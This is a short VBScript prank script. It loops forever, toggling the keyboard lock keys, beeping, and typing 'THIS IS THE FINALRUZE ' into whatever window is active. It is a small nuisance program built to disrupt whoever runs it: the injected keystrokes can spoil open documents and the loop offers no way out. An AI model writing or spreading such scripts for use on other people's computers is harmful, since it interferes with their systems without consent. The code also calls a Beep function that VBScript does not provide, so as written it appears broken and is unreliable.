Set x = CreateObject("WScript.Shell")
Do
    'Plays the first beeping sound
    Beep 500, 500
    WScript.Sleep 100
    x.SendKeys "{CAPSLOCK}"
    x.SendKeys "{NUMLOCK}"
    x.SendKeys "THIS IS THE FINALRUZE "
    x.SendKeys "{SCROLLLOCK}"
    'Plays the second beeping sound
    Beep 800, 300
    WScript.Sleep 100
Loop
